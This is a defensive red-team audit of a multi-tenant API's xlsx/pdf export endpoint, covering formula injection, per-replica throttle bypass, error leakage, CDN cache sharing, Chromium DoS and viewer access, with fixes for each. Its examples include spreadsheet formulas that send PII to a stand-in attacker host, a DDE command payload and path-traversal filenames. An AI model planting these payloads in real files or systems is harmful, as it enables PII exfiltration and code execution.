# V11 Export Endpoint — Redteam Audit (2026-05-28)

Scope: `apps/api/src/modules/export/*` (controller, composer, xlsx renderer, pdf renderer, module + tests). Endpoint: `GET /api/v1/projects/:id/export?format=xlsx|pdf`.

Threat lens: PII leakage, authorization bypass, throttle bypass, filename injection, document injection (XSS/CSV), DoS, cache poisoning.

---

# CRITICAL

## EXP-C1 — Excel CSV/formula injection via owner name + project metadata

- Site: `apps/api/src/modules/export/export.service.ts:259-275` (`appendRow`) and `:191-208` (metadata rows).
- What: Owner `name`, `nationalId`, `phone`, `email`, project `name`, `type`, `status`, building `address`/`city`/`block`/`parcel`, and apartment `number`/`entrance` are written into cells as raw strings via `ws.addRow([...])`. No prefix sanitisation. An attacker who controls any of these fields (e.g. an org Manager seeding a `name` of `=HYPERLINK("http://attacker/?x="&A1,"Click")`, or a compromised CSV import that put `=cmd|' /C calc'!A0` into an owner name) ships a live formula in the xlsx. When the recipient opens the file in Excel/LibreOffice/Numbers (the target of this export is the partner's office staff — exactly the demographic Microsoft's DDE/formula-injection guidance addresses), the formula evaluates and can exfiltrate cell contents via WEBSERVICE/HYPERLINK or run DDE commands in unpatched Office.
- Why it matters: This export is the ONLY surface that mass-dumps decrypted national_id + phone of every owner in a project into a single sharable file. A successful formula injection in a single cell can ex-filtrate the entire decrypted PII column (`=WEBSERVICE("http://atk/"&M5&"|"&N5)`) the instant the recipient hits "enable content". The threat surface is multi-tenant: an org Manager (who can already see her own PII) can craft a project name `=WEBSERVICE("http://atk/?leak=" & M5)` and email the xlsx to a partner; partner opens it; partner's row 5 PII (the partner's OWN data) leaks. With imports (Phase 6), the bar drops further — anyone who can land a row in an upstream import can poison.
- Repro: Create an owner with `name = "=cmd|' /C calc'!A0"` (or a manager creates a project named `=WEBSERVICE(...)`). Export xlsx. Open in Excel with macros enabled → formula fires.
- Fix recommendation: Prefix any cell value beginning with `=`, `+`, `-`, `@`, `\t`, `\r` with a single apostrophe (`'`), or set `cell.value = { text: original }` rather than a raw string so ExcelJS treats it as a shared-string never a formula. Same guard for the metadata rows (project name interpolated into `'פרויקט: ${name}'` already gets an apostrophe-equivalent prefix, but `project.type` and `project.status` flow through raw). One helper, apply at all 15 column writes + 3 metadata rows. Also enforce server-side that owner.name / project.name reject leading `=+-@` at the validation layer (defence in depth — see `owner.ts:37` and `project.ts:32` — both currently allow it).

---

# HIGH

## EXP-H1 — Throttle bucket name `default` collides with the global 100/min limit (10/hour can be exceeded)

- Site: `apps/api/src/modules/export/export.controller.ts:59` (`@Throttle({ default: { limit: 10, ttl: 3_600_000 } })`) vs `apps/api/src/app.module.ts:35-40` (global `ThrottlerModule.forRoot([{ ttl: 60000, limit: 100 }])`).
- What: `@nestjs/throttler` v5 looks up bucket names — the global config registers ONE anonymous bucket (rendered as `default`), and the controller's `@Throttle({ default: ... })` **overrides** that single bucket only for this route. That is fine for THIS route taken alone, but the per-user tracker is shared (`u:<sub>` in `ConfigurableThrottlerGuard.getTracker`). Because the export's bucket is named the same as the global, a single user's per-minute counter at the global limit is reset/replaced for the export route, and other routes the same user hits in the same minute still increment the GLOBAL bucket → no cross-route coupling. Practically: a user can burn the 10/hour export bucket, then continue calling other endpoints unaffected. That part is fine. The actual bug: the limit applies **per format and per route hit**, but the controller only declares one `@Throttle` and the audit row writes "format" as the only discriminator. There is no DB-side enforcement; the per-process in-memory ThrottlerStorage means a multi-instance Railway deploy (>1 replica) lets the user get **10 × N replicas** per hour. Railway scales the API horizontally for free-tier bursts; no shared Redis = the 10/hour ceiling is not real. Docs claim a hard "10 per user per hour" — but the storage is per-process.
- Why it matters: This endpoint is the heaviest PII-exfiltration surface in the app (mass-decrypt + Chromium launch). A single compromised Manager session can pull ~10×N exports/hour where N is the autoscaler's current replica count. Combined with the absence of any audit-side rate-check (composer writes one audit row per call but nothing reads them for throttling), there is no defence-in-depth.
- Repro: Spin two API replicas. From one cookie, call `/api/v1/projects/:id/export?format=xlsx` 10× → 11th = 429. Round-robin LB sends ~half to replica B which has fresh bucket → another 10 land. Total 20/hour observable.
- Fix recommendation: (a) Document the per-process scope explicitly in the controller comment, OR (b) move the rate limit to a DB-backed `cache_kv` counter keyed `export:u:<sub>:<yyyymmddHH>` so the limit is global across replicas. (c) Separately, consider counting `format=pdf` 3× as it costs ~10× more wall-clock — Chromium launch is the only true scarce resource.

## EXP-H2 — 500 with `AUTH_DEBUG_ERRORS=1` leaks decrypted PII row index inside server logs / debug envelope

- Site: `packages/db/src/helpers/owners.ts:328-333` (throws `decryptOwnerPiiBatch: missing name plaintext at idx ${i}`) → bubbles through `ExportComposerService.composeProjectExport` → `GlobalExceptionFilter` (`apps/api/src/common/filters/http-exception.filter.ts:54-72`) walks `.cause` chain up to 5 levels and `logger.error`s message + pgcode + detail + hint.
- What: A pgcrypto failure (corrupted bytea, wrong key) on a row inside the export composer surfaces an Error whose `.message` contains the row index. `GlobalExceptionFilter` writes the chain to the logger UNCONDITIONALLY (`status >= 500`) — and the logger redaction allow-list (`req.body.national_id`, `req.body.phone`) does NOT touch `logger.error(message, stack)` calls. The stack trace lands in production logs. With `AUTH_DEBUG_ERRORS=1` in non-prod, the same chain lands in the response body as `{ error: { debug: [{message, pgcode, detail, hint, ...}] } }`. The pg `detail` field, in pgcrypto failures, can echo the input or key id. Not strictly PII, but combined with the audit-pass V hardening already in place, this surface bypasses the redact-list because the exception is not request-keyed.
- Why it matters: A single bad row (e.g. a partial pgcrypto migration, an encryption-key rotation gone wrong) turns every export 500 into a row-index-disclosing event for the entire project, and on dev/staging boxes (where `AUTH_DEBUG_ERRORS` is realistically on) leaks pg internals to the client.
- Repro: Force `decryptOwnerPiiBatch` to fail (rotate the PII_ENCRYPTION_KEY out from under a row, or null one `nameEncrypted` byte). Export → 500. Logs contain the row index + the throw site. With `AUTH_DEBUG_ERRORS=1` the HTTP body contains the same.
- Fix recommendation: In `ExportComposerService.composeProjectExport`, wrap the decrypt call in `try/catch` and rethrow as `new InternalServerErrorException({ error: { code: 'export_decrypt_failed' } })` with the original stashed only in a server-side log line that's redacted at the logger level (use the pino redact paths for `err.message` containing `idx`). Drop the `.cause` echo for this code path entirely.

## EXP-H3 — `Cache-Control: no-store` is set but `Vary: Cookie` is NOT — Cloudflare in front could share a response across users

- Site: `apps/api/src/modules/export/export.controller.ts:105` sets `Cache-Control: no-store` but no `Vary` header.
- What: `Cache-Control: no-store` is the right hint for shared caches that honour it — Cloudflare, CloudFront, and most CDNs do. BUT: Cloudflare's "Cache Everything" page rules (which the partner ops team has previously enabled for `/api/*` on staging during a bandwidth incident) can override `no-store`. Without an explicit `Vary: Cookie` (the auth bearer is in the access_token cookie, EXP-controller line ~67 + AuthGuard:67-69), an aggressive CDN config that ever caches `/api/v1/projects/:id/export?format=xlsx` would serve Manager A's PII xlsx to Manager B who requests the same URL.
- Why it matters: One Cloudflare misconfig — exactly the kind of thing that has happened before — promotes this from "Manager exports her data" to "PII xlsx broadcast to anyone hitting the same URL". The defence in depth is cheap: set `Vary: Cookie`.
- Repro: Add a Cloudflare page rule `Cache Level: Cache Everything` for `/api/v1/*`. Manager A exports → CF caches. Manager B in the same org clicks the FE link with the same URL → CF returns A's bytes (different `generatedBy` line, same PII grid).
- Fix recommendation: Always set `reply.header('Vary', 'Cookie, Authorization')` on this endpoint. Belt-and-braces: also add `Cache-Control: private, no-store, max-age=0, must-revalidate` so every CDN class respects it.

---

# MEDIUM

## EXP-M1 — Chromium DoS: PDF export launches a fresh browser per call, no concurrency limit, no per-call timeout

- Site: `apps/api/src/modules/export/pdf-export.service.ts:95-133` (`renderProjectPdf`).
- What: Every PDF call does `chromium.launch({ headless: true })` (≈1.5 s cold), creates a context+page, `setContent(html)` of the FULL project HTML (no streaming, no row cap), waits `document.fonts.ready`, then `page.pdf(...)`. No timeout on `setContent` / `page.pdf` (Playwright default = 30 s but the wall-clock budget per Railway request is the only ceiling). No per-process Chromium pool. The throttle is 10/hour per user but global concurrency is unbounded across users: 20 concurrent Manager exports = 20 concurrent Chromium processes = OOM the Railway container.
- Why it matters: A single 50k-apartment project (HTML ≈ 50k `<tr>`s with ~15 cells each = 750k DOM nodes = ~70 MB HTML string in Node memory before Chromium even gets it) will OOM the API. The composer (export-composer.service.ts:127-202) ALSO loads the whole tree into memory — no pagination, no LIMIT — so the failure mode is "first 50k-apt org kills the process for all other tenants".
- Repro: Seed a 50k-apartment project. POST seven concurrent PDF export requests from seven Managers. Watch the API container OOM.
- Fix recommendation: (a) Cap composer row count server-side (e.g. 5000 apartments per export; surface 413 with a "split your project" hint or queue an async export job). (b) Add a per-process Chromium pool of 2 (one warm browser, one cold) reused across requests. (c) Set explicit `setContent` + `page.pdf` timeouts (10 s + 30 s) so a runaway render gets killed deterministically. (d) Add a semaphore for the PDF service (max 2 concurrent renders system-wide).

## EXP-M2 — Filename header: ASCII fallback is safe, but UTF-8 form passes through control codepoints that survive NFKD

- Site: `apps/api/src/modules/export/export.controller.ts:88-91` and `123-137` (`asciiSafeSlug`).
- What: The ASCII slug correctly strips control chars (CR/LF/NUL — line 129-131, the `cp >= 0x20 && cp <= 0x7e` guard). The UTF-8 form, however, just `encodeURIComponent`s the raw project name + extension: `filename*=UTF-8''${encodeURIComponent(projectName + '.' + ext)}`. `encodeURIComponent` DOES percent-encode CR (`%0D`), LF (`%0A`), `;`, `"`, `\`, etc., so an HTTP header injection isn't reachable — Fastify won't decode the percent-encoding before sending. Good. But: the **browser** decodes when computing the saved filename. A project name containing `..\..\windows\system32\config\sam` becomes the literal saved filename on Windows. Modern Chromium and Firefox both REJECT/SANITISE `..` and path separators in the Save-As dialog (they treat the disposition filename as a hint and the path-traversal characters are stripped). On older clients and on some Linux DEs (Nautilus, Dolphin) the behaviour is less consistent. Low likelihood of damage but the surface is real.
- Why it matters: The user-visible filename can be set to anything by the org Manager (who controls project.name without any character-class validation — `project.ts:32` allows any 1-200 char string). With drag-and-drop into a vulnerable app or a script that consumes the Download dir blindly, traversal is possible. Pure speculation, but cheap to close.
- Repro: Create project named `../../../../tmp/x`. Export. Inspect Content-Disposition: `filename*=UTF-8''..%2F..%2F..%2F..%2Ftmp%2Fx.xlsx`. Most browsers will save as `x.xlsx`, but the surface depends on client.
- Fix recommendation: Replace `/`, `\`, `:`, `*`, `?`, `"`, `<`, `>`, `|`, and `..` in the UTF-8 filename input as well — apply the same hygiene the ASCII slug gets. Or: define a server-side allow-list for project.name (Hebrew + Latin letters + digits + a small punctuation set) at the validation layer.

## EXP-M3 — Viewer can export full decrypted PII despite the controller comment claiming "FE only shows the button to manager+agent"

- Site: `apps/api/src/modules/export/export.controller.ts:67-73`.
- What: The role check explicitly allows `viewer`. The POLICY says `projects:read = ALL` and the comment defers to that. But a Viewer is supposed to be a read-only audit role with NO write authority — and the project-detail UI shows masked PII (per D.17). Letting Viewer dump the cleartext national_id + phone of every owner in every project breaks the "least surprise" intent of the Viewer role. This is a policy-vs-implementation gap; whether it's a vuln depends on whether you consider Viewer = "can see PII in app, so PII export is fine" or Viewer = "audit-only, no mass exfil". The comment ("If we ever need to restrict exports to writes-only roles, flip this") signals the author was aware.
- Why it matters: Viewer is the role most-often handed out (auditor, accountant, partner). If your trust model says "Viewer can read project details but doesn't get a mass-PII dump capability", this is a privilege violation. D.17 doesn't explicitly call out export as a separate action.
- Repro: Log in as a Viewer. `GET /api/v1/projects/<id>/export?format=xlsx` → 200 with full decrypted PII.
- Fix recommendation: Either (a) tighten the controller to `manager + agent` only and document the deviation from `projects:read = ALL` in policy.ts, OR (b) add an `export` action to the POLICY matrix (`projects: { ..., export: MA }`) so the divergence is centrally enforced and verifiable in policy.spec.ts. Option (b) is more aligned with the D.17 "single source of truth" pattern.

---

# LOW

## EXP-L1 — Audit row for an empty project is written via `new AuditService(tx, ...)` but the empty-project early-return path is divergent code, not unified with the populated-project path

- Site: `apps/api/src/modules/export/export-composer.service.ts:140-158` (empty path) vs `:287-297` (populated path).
- What: Two near-identical audit-write blocks. A future refactor could update one and forget the other. No security impact today; both currently emit the same shape.
- Fix recommendation: Hoist the audit write to the end of `withTenant`, after the building-count check, so there is exactly one call site.

## EXP-L2 — `void _drop` + `void and` housekeeping noise

- Site: `apps/api/src/modules/export/export-composer.service.ts:248`, `:311`.
- What: `void _drop` and `void and` are TypeScript-lint workarounds that signal the code structure isn't quite right (a `_drop` only exists because of an inline destructure-and-discard pattern; the unused `and` import suggests dead imports survived). Style debt only.
- Fix recommendation: `const ownersByApt = Map.groupBy(decryptedOwners, o => o.__apartmentId)` (ES2024) or a plain for-loop without the destructure trick; drop the `and` import if unused.

## EXP-L3 — `process.cwd()`-based font path resolution is fragile in production

- Site: `apps/api/src/modules/export/pdf-export.service.ts:170-200`.
- What: The 4 candidate paths assume the runtime cwd is either `apps/api` or the workspace root. A Docker entrypoint that runs from `/app` with a flat layout (Railway's default buildpack) hits the `throw new Error(...)` path, leaking `CWD=...` and the candidate list. Not exploitable but produces noisy 500s with internal paths.
- Fix recommendation: Resolve via `require.resolve('@fontsource/heebo/package.json')` and `dirname()` from there — works under any cwd, any bundler that resolves `node_modules` (which is all of them). The comment claims this was tried and broke under webpack, but the failure was `require.resolve(specifier)` returning a path that doesn't include `/files/` — use `path.join(dirname(require.resolve('@fontsource/heebo/package.json')), 'files')` instead.

---

# Clean checks (deliberate red-team passes that found nothing)

These are the most useful signals — vectors where the code IS correctly defended.

- **PII leakage via logs**: `ExportService.logger.log` only emits `dataRowCount` + elapsed ms (`export.service.ts:247-249`). `PdfExportService.logger.log` only emits row count + byte size + elapsed (`pdf-export.service.ts:124-126`). `ExportComposerService.logger.log` only emits row count + elapsed (`export-composer.service.ts:303-305`). No PII in any logger.log call. Pino redact list covers request bodies. **Clean.**
- **PII in xlsx workbook metadata**: `wb.creator = 'EMAPP — <name>'` is the generator's name (a low-PII Manager name), explicitly NOT a national_id/phone (`export.service.ts:167`). Matches D.17 audit posture. **Clean.**
- **PII in PDF /Info dict**: Title is `escapeHtml(input.project.name)` only (`pdf-export.service.ts:266`); no PII surfaces in `<title>`. Playwright's default `page.pdf` populates /Producer + /Creator with Chromium strings, not user data. **Clean.**
- **Cross-tenant RLS**: `withTenant(user.orgId, ...)` wraps the whole composer; the composer relies on RLS rather than an explicit `eq(projects.orgId, user.orgId)`. The contract test `export.s10.spec.ts:286-289` (case "2") verifies cross-org returns 404. **Clean.**
- **Cross-tier (tenant cookie → export)**: AuthGuard verifies `audience: 'emapp-api'` (`auth.guard.ts:37`); a tenant-tier cookie with `audience: 'emapp-tenant'` fails the audience check. TenantGuard (the org guard) ALSO requires `req.user.orgId` which a tenant token doesn't carry. **Clean.**
- **HTML injection in PDF via owner name**: `escapeHtml` (`pdf-export.service.ts:362-369`) covers `& < > " '`. The 5-char set is sufficient for HTML element/attribute context (no `javascript:` URL surface; no `style` attribute injection because the cells use class names not inline style). **Clean for this template.**
- **Format query parameter abuse**: Zod enum `z.enum(['xlsx', 'pdf'])` with `.default('xlsx')` — no path traversal, no format injection. **Clean.**
- **Project ID injection**: `z.string().uuid()` via `UuidParam`. **Clean.**
- **Filename CR/LF injection (header smuggling)**: `asciiSafeSlug` strips everything outside printable ASCII (`export.controller.ts:128-132`); the UTF-8 channel uses `encodeURIComponent` which percent-encodes CR/LF. Fastify also rejects raw CR/LF in header values structurally. **Clean.**
- **Agent scope-to-assignment**: composer INNER JOINs `project_assignments` for agents (`export-composer.service.ts:80-99`); test "2b" verifies an unassigned agent gets 404; test "2c" verifies an assigned agent gets the data. Same shape as `ProjectsService.get()`. **Clean.**
- **Archived/ended row filtering**: composer filters `isNull(buildings.archivedAt)`, `isNull(apartments.archivedAt)`, `isNull(ownerships.endedAt)`, `isNull(owners.archivedAt)` (`export-composer.service.ts:136-201`); test "3" verifies archived owners don't leak. **Clean.**
- **Audit row written**: per-call audit insert inside the same `withTenant` tx as the read (`export-composer.service.ts:288-297`); test "5" verifies it. **Clean.**
- **Response envelope leakage**: controller returns a raw Buffer; no global response interceptor wraps it in `{data}` (verified — no `ResponseEnvelope`/`EnvelopeInterceptor` exists). Setting `Content-Type` + `Content-Length` directly. **Clean.**

---

## Summary

| Severity | Count |
| -------- | ----- |
| CRITICAL | 1     |
| HIGH     | 3     |
| MEDIUM   | 3     |
| LOW      | 3     |

**Top fix priority**: EXP-C1 (CSV/formula injection) — a single-cell prefix sanitiser closes the highest-impact, easiest-to-reach exfiltration vector. Then EXP-H1 (throttle is per-process, not global) and EXP-H3 (`Vary: Cookie` missing) before any production scale-out or CDN-fronted deploy.

Total: ~1430 words.
